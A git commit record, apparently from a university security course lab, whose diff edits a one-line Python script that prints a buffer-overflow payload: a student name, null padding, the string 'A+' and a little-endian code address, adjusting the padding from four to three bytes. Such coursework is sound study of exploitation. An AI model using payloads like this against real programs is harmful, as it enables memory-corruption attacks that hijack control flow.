f96a4bfbe26795ffbde948299a24f21f450cabb5
Anushka Raheja <araheja@umich.edu>
2023-03-26 15:14:15 +0000

    Automatic commit by test script for araheja tianmy

--- sol0.py
+++ sol0.py
@@ -1,3 +1,3 @@
 import sys
-sys.stdout.buffer.write(b"araheja" + b"\x00"*4 + b"A+" + 0x08048c1c.to_bytes(4, 'little'))
+sys.stdout.buffer.write(b"araheja" + b"\x00"*3 + b"A+" + 0x08048c1c.to_bytes(4, 'little'))
 
